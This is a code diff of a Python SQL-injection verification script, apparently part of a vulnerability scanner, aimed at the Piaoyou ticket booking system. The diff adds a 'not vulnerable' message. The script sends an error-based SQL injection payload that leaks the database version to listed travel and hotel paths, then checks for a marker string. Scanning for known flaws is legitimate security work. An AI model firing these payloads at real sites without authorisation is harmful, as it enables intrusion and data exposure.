@@ -26,14 +26,18 @@ class piaoyou_multi_sqli_BaseVerify:
                 "/travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
                 "/hotel/Default.aspx?s=11"]
         try:
+            noexist = True
             for url in urls:
                 vulnurl = self.url + url + "%20AnD%201=CoNvErT(InT,ChAr(87)%2BChAr(116)%2BChAr(70)%2BChAr(97)%2BChAr(66)%2BChAr(99)%2B@@version)--"
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"WtFaBcMic" in req.text:
                     cprint("[+]存在票友机票预订系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在piaoyou_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
